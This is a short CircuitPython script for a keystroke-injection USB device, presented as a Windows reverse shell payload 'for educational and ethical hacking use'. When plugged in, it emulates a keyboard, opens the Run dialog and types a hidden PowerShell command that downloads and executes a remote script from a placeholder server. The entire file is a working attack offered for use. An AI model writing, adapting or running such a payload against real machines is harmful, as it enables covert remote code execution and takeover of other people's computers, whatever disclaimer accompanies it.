# The Ram - Reverse Shell Payload (Windows)
# Created for educational and ethical hacking use.
# --------------------------------------------

import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)

time.sleep(2)
kbd.press(Keycode.WINDOWS, Keycode.R)
kbd.release_all()
time.sleep(0.5)
layout.write("powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://your-server/shell.ps1')\"")
kbd.press(Keycode.ENTER)
kbd.release_all()

# The Ram - End of File
